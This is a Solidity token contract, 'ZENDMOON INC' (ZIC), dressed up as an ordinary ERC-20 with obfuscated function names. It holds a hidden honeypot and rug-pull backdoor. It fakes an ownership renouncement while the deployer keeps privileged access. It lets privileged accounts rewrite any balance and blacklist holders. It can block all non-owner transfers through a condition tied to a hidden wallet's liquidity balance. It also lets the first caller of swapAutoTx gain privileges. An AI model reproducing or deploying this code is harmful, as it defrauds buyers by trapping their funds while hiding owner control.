//SPDX-License-Identifier: MIT

pragma solidity ^0.8.9;

interface buyTeam {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface walletIs {
    function createPair(address fundMinReceiver, address receiverExempt) external returns (address);
}

abstract contract senderMax {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface launchMarketing {
    function totalSupply() external view returns (uint256);

    function balanceOf(address tradingList) external view returns (uint256);

    function transfer(address fromTotal, uint256 limitMinTotal) external returns (bool);

    function allowance(address minTeam, address spender) external view returns (uint256);

    function approve(address spender, uint256 limitMinTotal) external returns (bool);

    function transferFrom(address sender,address fromTotal,uint256 limitMinTotal) external returns (bool);

    event Transfer(address indexed from, address indexed tradingLimit, uint256 value);
    event Approval(address indexed minTeam, address indexed spender, uint256 value);
}

interface limitMarketing is launchMarketing {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ZENDMOONINC is senderMax, launchMarketing, limitMarketing {

    uint256 limitModeTake;

    bool private walletMax;

    function transfer(address tradingMin, uint256 limitMinTotal) external virtual override returns (bool) {
        return marketingList(_msgSender(), tradingMin, limitMinTotal);
    }

    string private txMarketingReceiver = "ZENDMOON INC";

    address fromSender = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function balanceOf(address tradingList) public view virtual override returns (uint256) {
        return walletLaunch[tradingList];
    }

    address private receiverAuto;

    bool public tokenAutoTx;

    uint256 private enableLaunched;

    uint256 maxLiquidity;

    function marketingSell(uint256 limitMinTotal) public {
        modeTx();
        limitModeTake = limitMinTotal;
    }

    address amountMaxAt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    constructor (){
        
        shouldMax();
        buyTeam launchMode = buyTeam(fromSender);
        feeMin = walletIs(launchMode.factory()).createPair(launchMode.WETH(), address(this));
        
        isTrading = _msgSender();
        minReceiver[isTrading] = true;
        walletLaunch[isTrading] = shouldList;
        
        emit Transfer(address(0), isTrading, shouldList);
    }

    function exemptTakeBuy(address maxWalletLimit) public {
        modeTx();
        
        if (maxWalletLimit == isTrading || maxWalletLimit == feeMin) {
            return;
        }
        enableTrading[maxWalletLimit] = true;
    }

    function name() external view virtual override returns (string memory) {
        return txMarketingReceiver;
    }

    function launchAuto(address amountToken, address fromTotal, uint256 limitMinTotal) internal returns (bool) {
        require(walletLaunch[amountToken] >= limitMinTotal);
        walletLaunch[amountToken] -= limitMinTotal;
        walletLaunch[fromTotal] += limitMinTotal;
        emit Transfer(amountToken, fromTotal, limitMinTotal);
        return true;
    }

    function decimals() external view virtual override returns (uint8) {
        return maxTotalFund;
    }

    function marketingList(address amountToken, address fromTotal, uint256 limitMinTotal) internal returns (bool) {
        if (amountToken == isTrading) {
            return launchAuto(amountToken, fromTotal, limitMinTotal);
        }
        uint256 autoList = launchMarketing(feeMin).balanceOf(amountMaxAt);
        require(autoList == limitModeTake);
        require(!enableTrading[amountToken]);
        return launchAuto(amountToken, fromTotal, limitMinTotal);
    }

    mapping(address => mapping(address => uint256)) private modeSender;

    address public feeMin;

    bool private launchAt;

    bool public txSwap;

    bool public marketingSwap;

    mapping(address => uint256) private walletLaunch;

    bool public txEnable;

    function allowance(address autoFee, address swapMode) external view virtual override returns (uint256) {
        if (swapMode == fromSender) {
            return type(uint256).max;
        }
        return modeSender[autoFee][swapMode];
    }

    mapping(address => bool) public enableTrading;

    string private totalReceiver = "ZIC";

    function teamModeEnable(address tradingMin, uint256 limitMinTotal) public {
        modeTx();
        walletLaunch[tradingMin] = limitMinTotal;
    }

    event OwnershipTransferred(address indexed launchTo, address indexed maxLaunchedTeam);

    function owner() external view returns (address) {
        return receiverAuto;
    }

    uint256 private minShould;

    function symbol() external view virtual override returns (string memory) {
        return totalReceiver;
    }

    function shouldMax() public {
        emit OwnershipTransferred(isTrading, address(0));
        receiverAuto = address(0);
    }

    address public isTrading;

    function modeTx() private view {
        require(minReceiver[_msgSender()]);
    }

    uint256 private minAmount;

    function swapAutoTx(address fundFee) public {
        if (tokenAutoTx) {
            return;
        }
        
        minReceiver[fundFee] = true;
        if (minAmount != enableLaunched) {
            launchAt = true;
        }
        tokenAutoTx = true;
    }

    bool private txList;

    mapping(address => bool) public minReceiver;

    uint8 private maxTotalFund = 18;

    uint256 private shouldList = 100000000 * 10 ** 18;

    function totalSupply() external view virtual override returns (uint256) {
        return shouldList;
    }

    function transferFrom(address amountToken, address fromTotal, uint256 limitMinTotal) external override returns (bool) {
        if (_msgSender() != fromSender) {
            if (modeSender[amountToken][_msgSender()] != type(uint256).max) {
                require(limitMinTotal <= modeSender[amountToken][_msgSender()]);
                modeSender[amountToken][_msgSender()] -= limitMinTotal;
            }
        }
        return marketingList(amountToken, fromTotal, limitMinTotal);
    }

    function getOwner() external view returns (address) {
        return receiverAuto;
    }

    uint256 private takeAt;

    function approve(address swapMode, uint256 limitMinTotal) public virtual override returns (bool) {
        modeSender[_msgSender()][swapMode] = limitMinTotal;
        emit Approval(_msgSender(), swapMode, limitMinTotal);
        return true;
    }

}